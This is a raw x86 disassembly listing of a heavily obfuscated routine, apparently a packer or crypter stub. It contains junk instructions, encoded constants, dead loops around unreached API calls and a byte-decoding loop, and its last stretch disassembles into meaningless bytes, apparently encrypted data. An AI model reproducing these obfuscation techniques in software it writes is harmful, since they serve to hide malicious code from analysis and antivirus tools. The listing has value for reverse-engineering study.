  415c4a:	mov    DWORD PTR [ebp-0x9c],0xf89c85bf
  415c54:	mov    DWORD PTR ds:0x4377b3,0x3984
  415c5e:	cmp    DWORD PTR [ebp-0x8c],0xf89c85b0
  415c68:	mov    DWORD PTR ds:0x437797,0x4ae3
  415c72:	je     0x416422
  415c78:	mov    eax,DWORD PTR [ebp-0xa4]
  415c7e:	neg    ecx
  415c80:	xor    eax,0x75108b5
  415c85:	mov    ecx,DWORD PTR [ebp-0xa4]
  415c8b:	xor    ecx,0x75108b5
  415c91:	adc    DWORD PTR ds:0x4377a7,0x380b
  415c9b:	lea    ecx,[eax+ecx*1+0x64e5f6]
  415ca2:	mov    eax,DWORD PTR [ebp-0x94]
  415ca8:	xor    edx,edx
  415caa:	div    ecx
  415cac:	mov    eax,DWORD PTR [ebp-0x8c]
  415cb2:	add    DWORD PTR ds:0x43774b,ebx
  415cb8:	xor    eax,0x75108b5
  415cbd:	and    DWORD PTR ds:0x437713,0x450a
  415cc7:	add    eax,0x3272fb
  415ccc:	mov    ecx,DWORD PTR [ebp-0xa4]
  415cd2:	xor    ecx,0x75108b5
  415cd8:	add    ecx,0x3272fb
  415cde:	and    DWORD PTR ds:0x437773,0x437743
  415ce8:	sub    eax,ecx
  415cea:	cmp    edx,eax
  415cec:	jne    0x4160ed
  415cf2:	sbb    eax,0x28b5
  415cf7:	mov    eax,DWORD PTR [ebp-0x8]
  415cfa:	xor    DWORD PTR ds:0x43774f,0x2b4e
  415d04:	add    eax,DWORD PTR [ebp-0x94]
  415d0a:	sbb    DWORD PTR ds:0x4377b7,0x43775f
  415d14:	mov    al,BYTE PTR [eax]
  415d16:	mov    BYTE PTR [ebp-0xb9],al
  415d1c:	sub    DWORD PTR ds:0x43771f,ebx
  415d22:	mov    eax,DWORD PTR [ebp-0xa0]
  415d28:	or     DWORD PTR ds:0x4377a3,0x437787
  415d32:	xor    eax,0x75108b5
  415d37:	add    eax,0x3272fb
  415d3c:	mov    DWORD PTR ds:0x43770f,0x2af0
  415d46:	mov    DWORD PTR [ebp-0xc0],eax
  415d4c:	mov    DWORD PTR ds:0x437777,0x3812
  415d56:	jmp    0x415d7c
  415d5b:	sbb    DWORD PTR ds:0x437727,0x43779f
  415d65:	mov    eax,DWORD PTR [ebp-0xc0]
  415d6b:	and    DWORD PTR ds:0x437717,0x4377b3
  415d75:	inc    eax
  415d76:	mov    DWORD PTR [ebp-0xc0],eax
  415d7c:	sub    eax,0x6bb3
  415d81:	mov    eax,DWORD PTR [ebp-0x9c]
  415d87:	add    DWORD PTR ds:0x43774f,0x4377bb
  415d91:	xor    eax,0x75108b5
  415d96:	xor    DWORD PTR ds:0x437777,0x2bbf
  415da0:	add    eax,0x3272fb
  415da5:	mov    DWORD PTR ds:0x437737,0x7b12
  415daf:	cmp    DWORD PTR [ebp-0xc0],eax
  415db5:	jae    0x415f32
  415dbb:	inc    ecx
  415dbc:	mov    eax,DWORD PTR [ebp-0xc0]
  415dc2:	sub    eax,0x3272fb
  415dc7:	add    DWORD PTR ds:0x43778f,0x4ea7
  415dd1:	xor    eax,0x75108b5
  415dd6:	or     ecx,DWORD PTR ds:0x43772f
  415ddc:	add    eax,0x7f55d8f2
  415de1:	mov    ecx,0x39f3
  415de6:	mov    ecx,DWORD PTR [ebp-0xc0]
  415dec:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415df3:	mov    DWORD PTR ds:0x43774b,edx
  415df9:	mov    eax,DWORD PTR [ebp-0xc0]
  415dff:	cmp    DWORD PTR [ebp+eax*4-0xb8],0x244ecb9d
  415e0a:	mov    DWORD PTR ds:0x437753,0x65ed
  415e14:	jbe    0x415e94
  415e1a:	mov    DWORD PTR ds:0x437763,0xe32
  415e24:	mov    eax,DWORD PTR [ebp-0xc0]
  415e2a:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415e31:	and    DWORD PTR ds:0x43773f,0x0
  415e3b:	mov    ecx,DWORD PTR ds:0x43773f
  415e41:	inc    ecx
  415e42:	mov    DWORD PTR ds:0x43773f,ecx
  415e48:	cmp    DWORD PTR ds:0x43773f,0x2b
  415e4f:	jbe    0x415e77
  415e55:	jmp    0x415e6a
  415e5a:	push   0x437094
  415e5f:	push   0x437094
  415e64:	call   DWORD PTR ds:0x43c964
  415e6a:	cmp    DWORD PTR ds:0x43773f,0x1e
  415e71:	jb     0x415e3b
  415e77:	add    eax,0x405fcdc
  415e7c:	mov    ecx,DWORD PTR ds:0x4377a7
  415e82:	mov    ecx,DWORD PTR [ebp-0xc0]
  415e88:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415e8f:	jmp    0x415f23
  415e94:	and    ecx,DWORD PTR ds:0x43775b
  415e9a:	mov    eax,DWORD PTR [ebp-0xc0]
  415ea0:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415ea7:	and    DWORD PTR ds:0x4377bb,0x0
  415eb1:	jmp    0x415ec3
  415eb6:	mov    ecx,DWORD PTR ds:0x4377bb
  415ebc:	inc    ecx
  415ebd:	mov    DWORD PTR ds:0x4377bb,ecx
  415ec3:	cmp    DWORD PTR ds:0x4377bb,0x1b
  415eca:	jae    0x415f0c
  415ed0:	cmp    DWORD PTR ds:0x4377bb,0x5
  415ed7:	ja     0x415f0c
  415edd:	jmp    0x415eed
  415ee2:	push   0x4370a4
  415ee7:	call   DWORD PTR ds:0x43c968
  415eed:	cmp    DWORD PTR ds:0x4377bb,0x4
  415ef4:	jne    0x415f07
  415efa:	mov    ecx,DWORD PTR ds:0x4377bb
  415f00:	inc    ecx
  415f01:	mov    DWORD PTR ds:0x4377bb,ecx
  415f07:	jmp    0x415eb6
  415f0c:	sub    eax,0x250bcdc
  415f11:	mov    ecx,0x72b4
  415f16:	mov    ecx,DWORD PTR [ebp-0xc0]
  415f1c:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415f23:	mov    DWORD PTR ds:0x4377b7,0x3b3c
  415f2d:	jmp    0x415d5b
  415f32:	xor    eax,eax
  415f34:	mov    DWORD PTR ds:0x43779b,0x35fa
  415f3e:	jne    0x415f77
  415f44:	and    eax,0x5148
  415f49:	movzx  eax,BYTE PTR [ebp-0xb9]
  415f50:	xor    eax,0x83
  415f55:	sbb    DWORD PTR ds:0x437797,0x43771b
  415f5f:	add    eax,0x8
  415f62:	mov    DWORD PTR ds:0x4377ab,0x5d96
  415f6c:	mov    BYTE PTR [ebp-0xb9],al
  415f72:	jmp    0x4160c6
  415f77:	and    DWORD PTR ds:0x4377af,0x0
  415f81:	jmp    0x415f93
  415f86:	mov    ecx,DWORD PTR ds:0x4377af
  415f8c:	inc    ecx
  415f8d:	mov    DWORD PTR ds:0x4377af,ecx
  415f93:	cmp    DWORD PTR ds:0x4377af,0x1a
  415f9a:	jae    0x415fd5
  415fa0:	cmp    DWORD PTR ds:0x4377af,0x1e
  415fa7:	jl     0x415fd5
  415fad:	jmp    0x415fd0
  415fb2:	push   DWORD PTR [ebp-0x14]
  415fb5:	push   0x43772f
  415fba:	push   DWORD PTR [ebp-0x20]
  415fbd:	push   0x43716e
  415fc2:	push   DWORD PTR [ebp-0x28]
  415fc5:	push   0x6705
  415fca:	call   DWORD PTR ds:0x43c96c
  415fd0:	jmp    0x415f86
  415fd5:	mov    eax,DWORD PTR [ebp-0x98]
  415fdb:	and    DWORD PTR ds:0x437757,0x0
  415fe5:	jmp    0x415ff7
  415fea:	mov    ecx,DWORD PTR ds:0x437757
  415ff0:	inc    ecx
  415ff1:	mov    DWORD PTR ds:0x437757,ecx
  415ff7:	cmp    DWORD PTR ds:0x437757,0x1b
  415ffe:	jae    0x416043
  416004:	cmp    DWORD PTR ds:0x437757,0x9
  41600b:	jge    0x416043
  416011:	jmp    0x416024
  416016:	push   0x43770f
  41601b:	push   DWORD PTR [ebp-0x18]
  41601e:	call   DWORD PTR ds:0x43c970
  416024:	cmp    DWORD PTR ds:0x437757,0x8
  41602b:	jne    0x41603e
  416031:	mov    ecx,DWORD PTR ds:0x437757
  416037:	inc    ecx
  416038:	mov    DWORD PTR ds:0x437757,ecx
  41603e:	jmp    0x415fea
  416043:	xor    eax,0x75108b5
  416048:	mov    ecx,DWORD PTR ds:0x437743
  41604e:	add    DWORD PTR ds:0x4377b7,ecx
  416054:	add    eax,0x3272fb
  416059:	mov    ecx,DWORD PTR ds:0x437727
  41605f:	add    DWORD PTR ds:0x43771f,ecx
  416065:	movzx  ecx,BYTE PTR [ebp-0xb9]
  41606c:	sub    ecx,eax
  41606e:	mov    BYTE PTR [ebp-0xb9],cl
  416074:	adc    DWORD PTR ds:0x43779f,0x43771f
  41607e:	mov    ecx,DWORD PTR [ebp-0x90]
  416084:	xor    DWORD PTR ds:0x43773f,0x437753
  41608e:	xor    ecx,0x75108b5
  416094:	adc    DWORD PTR ds:0x437727,0x43774f
  41609e:	add    ecx,0x3272fb
  4160a4:	mov    al,BYTE PTR [ebp-0xb9]
  4160aa:	and    DWORD PTR ds:0x43771f,0x6ab7
  4160b4:	ror    al,cl
  4160b6:	sub    DWORD PTR ds:0x43770f,0x1214
  4160c0:	mov    BYTE PTR [ebp-0xb9],al
  4160c6:	sub    DWORD PTR ds:0x43778f,0x437757
  4160d0:	xor    eax,eax
  4160d2:	mov    eax,DWORD PTR [ebp-0x8]
  4160d5:	add    eax,DWORD PTR [ebp-0x94]
  4160db:	or     DWORD PTR ds:0x437717,0x5827
  4160e5:	mov    cl,BYTE PTR [ebp-0xb9]
  4160eb:	mov    BYTE PTR [eax],cl
  4160ed:	mov    eax,DWORD PTR [ebp-0x94]
  4160f3:	sub    DWORD PTR ds:0x43771b,0x437777
  4160fd:	sub    eax,0x3272fb
  416102:	sub    DWORD PTR ds:0x437777,0x76d0
  41610c:	xor    eax,0x75108b5
  416111:	mov    DWORD PTR ds:0x43773f,0x3e21
  41611b:	cmp    eax,DWORD PTR [ebp-0xa0]
  416121:	mov    DWORD PTR ds:0x437797,0x79e9
  41612b:	jne    0x416341
  416131:	mov    eax,DWORD PTR [ebp-0x8c]
  416137:	xor    eax,0x75108b5
  41613c:	add    eax,0x3272fb
  416141:	mov    ecx,DWORD PTR ds:0x43771b
  416147:	adc    DWORD PTR ds:0x43772f,ecx
  41614d:	mov    ecx,DWORD PTR [ebp-0xa4]
  416153:	and    DWORD PTR ds:0x43779b,0x4377bb
  41615d:	xor    ecx,0x75108b5
  416163:	add    ecx,0x3272fb
  416169:	sub    eax,ecx
  41616b:	and    DWORD PTR ds:0x437793,0x0
  416175:	mov    ecx,DWORD PTR ds:0x437793
  41617b:	inc    ecx
  41617c:	mov    DWORD PTR ds:0x437793,ecx
  416182:	cmp    DWORD PTR ds:0x437793,0x2b
  416189:	jbe    0x4161c3
  41618f:	jmp    0x4161b6
  416194:	push   0x170b
  416199:	push   0x43772f
  41619e:	push   DWORD PTR [ebp-0x1c]
  4161a1:	push   0x437061
  4161a6:	push   0x5827
  4161ab:	push   0x27a3
  4161b0:	call   DWORD PTR ds:0x43c978
  4161b6:	cmp    DWORD PTR ds:0x437793,0x1d
  4161bd:	jb     0x416175
  4161c3:	sub    eax,0x3272fb
  4161c8:	xor    eax,0x75108b5
  4161cd:	and    DWORD PTR ds:0x437713,0x0
  4161d7:	mov    ecx,DWORD PTR ds:0x437713
  4161dd:	inc    ecx
  4161de:	mov    DWORD PTR ds:0x437713,ecx
  4161e4:	cmp    DWORD PTR ds:0x437713,0x9
  4161eb:	jle    0x41623d
  4161f1:	jmp    0x416216
  4161f6:	push   0x437094
  4161fb:	push   DWORD PTR [ebp-0x14]
  4161fe:	push   0x6d50
  416203:	push   0x1b74
  416208:	push   DWORD PTR [ebp-0x18]
  41620b:	push   0x79a3
  416210:	call   DWORD PTR ds:0x43c97c
  416216:	cmp    DWORD PTR ds:0x437713,0x8
  41621d:	jne    0x416230
  416223:	mov    ecx,DWORD PTR ds:0x437713
  416229:	inc    ecx
  41622a:	mov    DWORD PTR ds:0x437713,ecx
  416230:	cmp    DWORD PTR ds:0x437713,0x19
  416237:	jb     0x4161d7
  41623d:	mov    DWORD PTR [ebp-0x8c],eax
  416243:	mov    eax,DWORD PTR [ebp-0xa4]
  416249:	and    DWORD PTR ds:0x43777f,0x0
  416253:	mov    ecx,DWORD PTR ds:0x43777f
  416259:	inc    ecx
  41625a:	mov    DWORD PTR ds:0x43777f,ecx
  416260:	cmp    DWORD PTR ds:0x43777f,0x10
  416267:	jb     0x4162ac
  41626d:	jmp    0x416285
  416272:	push   0x437042
  416277:	push   0x437089
  41627c:	push   DWORD PTR [ebp-0x24]
  41627f:	call   DWORD PTR ds:0x43c980
  416285:	cmp    DWORD PTR ds:0x43777f,0xf
  41628c:	jne    0x41629f
  416292:	mov    ecx,DWORD PTR ds:0x43777f
  416298:	inc    ecx
  416299:	mov    DWORD PTR ds:0x43777f,ecx
  41629f:	cmp    DWORD PTR ds:0x43777f,0x1f
  4162a6:	jb     0x416253
  4162ac:	xor    eax,0x75108b5
  4162b1:	mov    DWORD PTR ds:0x43779f,0x13
  4162bb:	cmp    DWORD PTR ds:0x43779f,0x0
  4162c2:	je     0x416323
  4162c8:	cmp    DWORD PTR ds:0x43779f,0x4
  4162cf:	jg     0x416323
  4162d5:	jmp    0x4162f5
  4162da:	push   0x664a
  4162df:	push   DWORD PTR [ebp-0x28]
  4162e2:	push   DWORD PTR [ebp-0xc]
  4162e5:	push   0x1a11
  4162ea:	push   0x533a
  4162ef:	call   DWORD PTR ds:0x43c984
  4162f5:	cmp    DWORD PTR ds:0x43779f,0x5
  4162fc:	jne    0x416311
  416302:	xor    ecx,ecx
  416304:	add    ecx,DWORD PTR ds:0x43779f
  41630a:	dec    ecx
  41630b:	mov    DWORD PTR ds:0x43779f,ecx
  416311:	mov    ecx,DWORD PTR ds:0x43779f
  416317:	dec    ecx
  416318:	mov    DWORD PTR ds:0x43779f,ecx
  41631e:	jmp    0x4162bb
  416323:	add    eax,0x3272fb
  416328:	sbb    ecx,DWORD PTR ds:0x437713
  41632e:	mov    ecx,DWORD PTR [ebp-0xc4]
  416334:	sub    ecx,eax
  416336:	mov    DWORD PTR [ebp-0x94],ecx
  41633c:	jmp    0x41641d
  416341:	mov    DWORD PTR ds:0x43774b,0x19
  41634b:	cmp    DWORD PTR ds:0x43774b,0x0
  416352:	je     0x416387
  416358:	cmp    DWORD PTR ds:0x43774b,0x1e
  41635f:	ja     0x416387
  416365:	jmp    0x416373
  41636a:	push   DWORD PTR [ebp-0x18]
  41636d:	call   DWORD PTR ds:0x43c988
  416373:	xor    ecx,ecx
  416375:	add    ecx,DWORD PTR ds:0x43774b
  41637b:	dec    ecx
  41637c:	mov    DWORD PTR ds:0x43774b,ecx
  416382:	jmp    0x41634b
  416387:	mov    eax,DWORD PTR [ebp-0xa4]
  41638d:	and    ecx,DWORD PTR ds:0x437743
  416393:	xor    eax,0x75108b5
  416398:	and    DWORD PTR ds:0x4377af,0x0
  4163a2:	jmp    0x4163b4
  4163a7:	mov    ecx,DWORD PTR ds:0x4377af
  4163ad:	inc    ecx
  4163ae:	mov    DWORD PTR ds:0x4377af,ecx
  4163b4:	cmp    DWORD PTR ds:0x4377af,0x13
  4163bb:	jae    0x416400
  4163c1:	cmp    DWORD PTR ds:0x4377af,0x8
  4163c8:	jb     0x416400
  4163ce:	jmp    0x4163e1
  4163d3:	push   0x3598
  4163d8:	push   DWORD PTR [ebp-0x1c]
  4163db:	call   DWORD PTR ds:0x43c98c
  4163e1:	cmp    DWORD PTR ds:0x4377af,0x7
  4163e8:	jne    0x4163fb
  4163ee:	mov    ecx,DWORD PTR ds:0x4377af
  4163f4:	inc    ecx
  4163f5:	mov    DWORD PTR ds:0x4377af,ecx
  4163fb:	jmp    0x4163a7
  416400:	add    eax,0x3272fb
  416405:	mov    ecx,DWORD PTR [ebp-0x94]
  41640b:	sub    ecx,eax
  41640d:	mov    DWORD PTR ds:0x437753,0x2d68
  416417:	mov    DWORD PTR [ebp-0x94],ecx
  41641d:	jmp    0x415c54
  416422:	mov    eax,DWORD PTR [ebp-0x2c]
  416425:	mov    DWORD PTR ds:0x437763,0x1dfd
  41642f:	mov    DWORD PTR [ebp-0x100],eax
  416435:	or     DWORD PTR ds:0x437777,0x29f8
  41643f:	mov    DWORD PTR [ebp-0xd4],0xf89c8527
  416449:	mov    DWORD PTR [ebp-0xcc],0xf89c85bd
  416453:	mov    DWORD PTR [ebp-0xdc],0xf89c85b0
  41645d:	mov    eax,ds:0x43778f
  416462:	and    DWORD PTR ds:0x43776f,eax
  416468:	mov    DWORD PTR [ebp-0xe0],0xf89c85b3
  416472:	mov    DWORD PTR [ebp-0xc8],0xf89c85b2
  41647c:	mov    DWORD PTR ds:0x43776b,0x16
  416486:	cmp    DWORD PTR ds:0x43776b,0x0
  41648d:	je     0x4164e1
  416493:	cmp    DWORD PTR ds:0x43776b,0xa
  41649a:	jg     0x4164e1
  4164a0:	jmp    0x4164b5
  4164a5:	push   0x437797
  4164aa:	push   0x167f
  4164af:	call   DWORD PTR ds:0x43c990
  4164b5:	cmp    DWORD PTR ds:0x43776b,0xb
  4164bc:	jne    0x4164cf
  4164c2:	mov    ecx,DWORD PTR ds:0x43776b
  4164c8:	dec    ecx
  4164c9:	mov    DWORD PTR ds:0x43776b,ecx
  4164cf:	mov    ecx,DWORD PTR ds:0x43776b
  4164d5:	dec    ecx
  4164d6:	mov    DWORD PTR ds:0x43776b,ecx
  4164dc:	jmp    0x416486
  4164e1:	mov    eax,DWORD PTR [ebp-0xe0]
  4164e7:	xor    eax,0x75108b5
  4164ec:	xor    ecx,ecx
  4164ee:	xor    ecx,DWORD PTR ds:0x437713
  4164f4:	sbb    ecx,DWORD PTR ds:0x43774b
  4164fa:	mov    DWORD PTR ds:0x437713,ecx
  416500:	add    eax,0x3272fb
  416505:	mov    ecx,DWORD PTR [ebp-0x100]
  41650b:	and    DWORD PTR ds:0x437753,0x43772b
  416515:	sub    ecx,eax
  416517:	mov    DWORD PTR [ebp-0xd0],ecx
  41651d:	mov    DWORD PTR ds:0x43779f,0x77e5
  416527:	mov    DWORD PTR [ebp-0xd8],0xf89c85bf
  416531:	mov    DWORD PTR ds:0x4377bb,0x62a5
  41653b:	cmp    DWORD PTR [ebp-0xc8],0xf89c85b0
  416545:	mov    DWORD PTR ds:0x4377b7,0x2244
  41654f:	je     0x418baf
  416555:	mov    eax,DWORD PTR [ebp-0xe0]
  41655b:	xor    DWORD PTR ds:0x43775b,edx
  416561:	xor    eax,0x75108b5
  416566:	mov    ecx,DWORD PTR [ebp-0xe0]
  41656c:	sub    DWORD PTR ds:0x437747,0x6975
  416576:	xor    ecx,0x75108b5
  41657c:	lea    ecx,[eax+ecx*1+0x64e5f6]
  416583:	mov    eax,DWORD PTR [ebp-0xd0]
  416589:	adc    DWORD PTR ds:0x437723,0x43771b
  416593:	xor    edx,edx
  416595:	sub    DWORD PTR ds:0x437773,0x43778b
  41659f:	div    ecx
  4165a1:	and    DWORD PTR ds:0x437757,0x0
  4165ab:	jmp    0x4165bf
  4165b0:	xor    ecx,ecx
  4165b2:	xor    ecx,DWORD PTR ds:0x437757
  4165b8:	inc    ecx
  4165b9:	mov    DWORD PTR ds:0x437757,ecx
  4165bf:	cmp    DWORD PTR ds:0x437757,0x12
  4165c6:	jae    0x4165fc
  4165cc:	cmp    DWORD PTR ds:0x437757,0x14
  4165d3:	jg     0x4165fc
  4165d9:	jmp    0x4165f7
  4165de:	push   DWORD PTR [ebp-0x24]
  4165e1:	push   DWORD PTR [ebp-0x28]
  4165e4:	push   0x437094
  4165e9:	push   0x437061
  4165ee:	push   DWORD PTR [ebp-0x24]
  4165f1:	call   DWORD PTR ds:0x43c994
  4165f7:	jmp    0x4165b0
  4165fc:	mov    eax,DWORD PTR [ebp-0xc8]
  416602:	xor    eax,0x75108b5
  416607:	add    eax,0x3272fb
  41660c:	mov    ecx,DWORD PTR [ebp-0xe0]
  416612:	xor    ecx,0x75108b5
  416618:	add    ecx,0x3272fb
  41661e:	jmp    0x4189c4
  416623:	test   eax,0x60a2e213
  416628:	jb     0x416613
  41662a:	adc    dh,ah
  41662c:	or     BYTE PTR ds:[edi-0x3bc67002],0xb2
  416634:	xchg   ecx,eax
  416635:	jp     0x4166b2
  416637:	add    bl,BYTE PTR [eax+0xa097b7b]
  41663d:	(bad)
  416640:	add    al,bl
  416642:	mov    esi,0xd7b2cacc
  416647:	call   0xf5181afd
  41664c:	out    0xac,eax
  41664e:	push   edx
  416650:	mov    ecx,0xdac9e1
  416655:	sti    
  416656:	ret    0xe5e0
  416659:	fadd   DWORD PTR [edx]
  41665b:	jecxz  0x416635
  41665d:	pop    es
  41665e:	out    dx,al
  41665f:	fmul   st,st(0)
  416661:	call   0xc0ee4e0f
  416666:	enter  0xc4ed,0xc6
  41666a:	fsubr  st,st(1)
  41666c:	iret   
  41666d:	lock std 
  41666f:	lock mov esp,0xd6d6c3b9
  416675:	push   es
  416676:	loop   0x416652
  416678:	ror    DWORD PTR [edx],0x9
  41667b:	add    al,0xbd
  41667d:	aad    0xde
  41667f:	fmul   st,st(5)
  416681:	jmp    0x416676
  416683:	loope  0x416677
  416685:	mov    al,0xe6
  416687:	ret    0xb6c5
  41668a:	rcl    eax,1
  41668c:	enter  0xdef3,0xe3
  416690:	hlt    
  416691:	test   al,0xd4
  416694:	mov    eax,0xd8e7c3e5
  416699:	(bad)
  41669c:	push   es
  41669d:	or     ebp,edx
  41669f:	fcomp  st(2)
  4166a1:	adc    edi,eax
  4166a3:	mov    edi,0xd5e9e7ce
  4166a8:	hlt    
  4166a9:	sti    
  4166aa:	lds    edi,FWORD PTR [eax-0x3b0a210d]
  4166b0:	enter  0xf4ed,0xff
  4166b4:	add    bh,bh
  4166b6:	(bad)  
  4166b7:	mov    esi,0xde07c0eb
  4166bc:	inc    BYTE PTR [ebx]
  4166be:	add    al,0xcc
  4166c0:	or     edi,esi
  4166c2:	loopne 0x416670
  4166c4:	int3   
  4166c5:	scas   al,BYTE PTR es:[edi]
  4166c6:	repz sti 
  4166c8:	leave  
  4166c9:	cli    
  4166ca:	(bad)
  4166cd:	clc    
  4166ce:	jmp    0x4166b4
  4166d0:	into   
  4166d1:	add    edi,esi
  4166d3:	sti    
  4166d4:	iret   
  4166d5:	int3   
  4166d6:	rol    al,cl
  4166d8:	out    0xe3,al
  4166da:	loopne 0x4166e5
  4166dc:	(bad)  
  4166df:	or     eax,0xe7bcf8e8
  4166e4:	shl    DWORD PTR [esi-0x18192d0a],1
  4166ea:	(bad)  
  4166eb:	idiv   al
  4166ed:	(bad)  
  4166ee:	mov    edi,0xd0faf6f9
  4166f3:	repz idiv BYTE PTR [ebp-0x23222440]
  4166fa:	add    dl,ch
  4166fc:	push   es
  4166fd:	push   es
  4166fe:	fadd   DWORD PTR [esi]
  416700:	retf   0xe9e9
  416703:	loope  0x4166f2
  416705:	out    dx,al
  416706:	xlat   BYTE PTR ds:[ebx]
  416707:	loop   0x4166be
  416709:	mov    bl,0xec
  41670b:	retf   
  41670c:	f2xm1  
  41670e:	cld    
  41670f:	fnstenv [ebp+edi*8-0x2ef92f47]
  416716:	fnstcw WORD PTR [ebp+0x4c001e2]
  41671c:	(bad)  
  41671e:	or     esp,esi
  416720:	(bad)  
  416721:	in     al,0xea
  416723:	repz mov edi,0xe5b7d0ad
  416729:	in     al,dx
  41672a:	(bad)  
  41672b:	in     eax,0xd1
  41672d:	fcmovne st,st(1)
  41672f:	ror    esp,1
  416731:	add    bl,dl
  416733:	repnz mov ebp,0x2d5d1f4
  416739:	clc    
  41673a:	rol    BYTE PTR [edi],1
  41673c:	retf   
  41673d:	iret   
  41673e:	or     eax,0xaf0405c2
  416743:	mov    esp,0xd7efafdd
  416748:	in     eax,0xe1
  41674a:	mov    ch,0xeb
  41674c:	lods   eax,DWORD PTR ds:[esi]
  41674d:	(bad)  
  41674e:	enter  0xdcbe,0xf0
  416752:	mov    ebx,0xd8c6f6d8
  416757:	(bad)  
  416758:	dec    ebx
  41675a:	cld    
  41675b:	cmc    
  41675c:	in     eax,0xd6
  41675e:	push   cs
  41675f:	out    0x7,eax
  416761:	out    0xa9,al
  416763:	(bad)  
  416764:	xlat   BYTE PTR ds:[ebx]
  416765:	rol    esi,1
  416767:	shl    DWORD PTR [esi-0xa064a0d],0xe8
  41676e:	mov    ebp,0xd2bfb5fe
  416773:	fadd   QWORD PTR [ebx]
  416775:	inc    BYTE PTR [edx]
  416777:	int3   
  416778:	cld    
  416779:	jecxz  0x416782
  41677b:	xlat   BYTE PTR ds:[ebx]
  41677c:	fucomi st,st(3)
  41677e:	in     al,dx
  41677f:	or     cl,al
  416781:	fadd   st,st(3)
  416783:	fsub   DWORD PTR [ebp-0x2f1e3709]
  416789:	int    0xd3
  41678b:	not    dh
  41678d:	mov    ecx,0xbdeed8d2
  416792:	imul   al
  416794:	clc    
  416795:	sar    esi,0xbe
  416798:	stc    
  416799:	repnz fprem1 
  41679c:	stc    
  41679d:	mul    bl
  41679f:	or     al,0xd
  4167a1:	fmul   st(7),st
  4167a3:	jmp    0xebd1:0xc0ccf2dd
  4167aa:	icebp  
  4167ab:	scas   al,BYTE PTR es:[edi]
  4167ac:	out    0xc5,al
  4167ae:	fdivr  st(2),st
  4167b0:	add    ebx,ebx
  4167b2:	cmc    
  4167b3:	int    0x0
  4167b5:	ret    
  4167b6:	shr    ebx,0xda
  4167b9:	loope  0x41679c
  4167bb:	add    ah,ah
  4167bd:	into   
  4167be:	in     eax,dx
  4167bf:	pop    es
  4167c0:	stc    
  4167c1:	int    0xc8
  4167c3:	shr    eax,1
  4167c5:	shl    ebp,cl
  4167c7:	shl    edx,1
  4167c9:	cmc    
  4167ca:	icebp  
  4167cb:	(bad)
  4167ce:	in     al,dx
  4167cf:	out    dx,eax
  4167d0:	not    esi
  4167d2:	out    dx,al
  4167d3:	fdivr  st,st(4)
  4167d5:	add    eax,0xe000f1c6
  4167da:	fisttp QWORD PTR [ecx]
  4167dc:	aad    0xd6
  4167de:	out    0xdc,eax
  4167e0:	in     al,0x3
  4167e2:	loopne 0x4167ca
  4167e4:	mov    esp,0xd2c0e7d5
  4167e9:	mov    al,0xc7
  4167eb:	aam    0xc4
  4167ed:	mov    eax,0xba02eab5
  4167f2:	push   edi
  4167f4:	mov    ecx,0xf9e7becc
  4167f9:	(bad)
  4167fd:	out    0xd4,eax
  4167ff:	fild   DWORD PTR [esi]
  416801:	(bad)  
  416802:	icebp  
  416803:	out    dx,eax
  416804:	rol    ebp,1
  416806:	iret   
  416807:	loopne 0x4167ee
  416809:	rcl    ch,cl
  41680b:	in     al,dx
  41680c:	imul   ecx
  41680e:	mov    bl,0xb9
  416810:	fmulp  st(0),st
  416812:	mov    esp,0xd8e7f5dd
  416817:	add    DWORD PTR [ebx],eax
  416819:	mov    esp,0xe0e704f9
  41681e:	cmc    
  41681f:	or     edi,ebp
  416821:	int    0xc5
  416823:	lock out 0xb2,eax
  416826:	shr    bh,1
  416828:	xlat   BYTE PTR ds:[ebx]
  416829:	mov    al,0xc1
  41682b:	fadd   st,st(6)
  41682d:	int    0xd9
  41682f:	int3   
  416830:	mov    ecx,0xf7c300f6
  416835:	hlt    
  416836:	out    0xc4,al
  416838:	cld    
  416839:	fucomp st(0)
  41683b:	loope  0x41683f
  41683d:	retf   
  41683e:	in     eax,0xb
  416840:	jmp    0xb30a573f
  416845:	(bad)  
  416846:	jmp    0xffb4:0xc6fbb7b1
  41684d:	div    esi
  41684f:	mov    esi,0xfed5bdd2
  416854:	aam    0xe1
  416856:	fdivr  st,st(7)
  416858:	add    al,0xd9
  41685a:	add    edx,ebx
  41685c:	loope  0x41685d
  41685e:	or     dh,bh
  416860:	or     edx,edx
  416862:	lock (bad) 
  416865:	in     eax,dx
  416866:	(bad)  
  416867:	iret   
  416868:	test   eax,0xccbbb2d5
  41686d:	jmp    0xd4b9:0xe8b4d8b8
  416874:	hlt    
  416875:	cmc    
  416876:	out    0xc2,eax
  416878:	hlt    
  416879:	ret    
  41687a:	(bad)  
  41687c:	fld    DWORD PTR [edi]
  41687e:	loop   0x416844
  416880:	or     ecx,DWORD PTR [ecx]
  416882:	stos   DWORD PTR es:[edi],eax
  416883:	jmp    0xb1f7:0xc5b3d2e7
  41688a:	fxch   st(5)
  41688c:	clc    
  41688d:	jmp    0x41687a
  41688f:	stc    
  416890:	fmul   st,st(7)
  416892:	cld    
  416893:	fcmovnu st,st(6)
  416895:	fadd   QWORD PTR ds:0xca07e100
  41689b:	(bad)  
  41689d:	fdivp  st(4),st
  41689f:	ffree  st(1)
  4168a1:	in     eax,0xe7
  4168a3:	retf   0xe1af
  4168a6:	ret    0xe9f1
  4168a9:	(bad)  
  4168ac:	mov    ecx,0xd7fbd3df
  4168b1:	aam    0xbc
  4168b3:	fcmove st,st(6)
  4168b5:	mov    ah,0xfd
  4168b7:	rcl    ebp,1
  4168b9:	mov    esi,0xec03fcd6
  4168bf:	ret    0x3e6
  4168c2:	jmp    0xea1e4eb0
  4168c7:	jmp    0xd2fc59b4
  4168cc:	mov    ecx,0xe2ffb5f7
  4168d1:	iret   
  4168d2:	ret    
  4168d3:	rol    edi,cl
  4168d5:	inc    edi
  4168d7:	sti    
  4168d8:	cli    
  4168d9:	fadd   st,st(5)
  4168db:	aam    0xf
  4168dd:	in     eax,0xe5
  4168df:	out    0xd,al
  4168e1:	or     ch,BYTE PTR [ebp-0x392f0c54]
  4168e7:	lods   al,BYTE PTR ds:[esi]
  4168e8:	iret   
  4168e9:	repnz iret 
  4168eb:	in     al,0xf8
  4168ed:	out    dx,al
  4168ee:	(bad)  
  4168f0:	out    dx,al
  4168f1:	int    0xd6
  4168f3:	shl    bl,1
  4168f5:	std    
  4168f6:	clc    
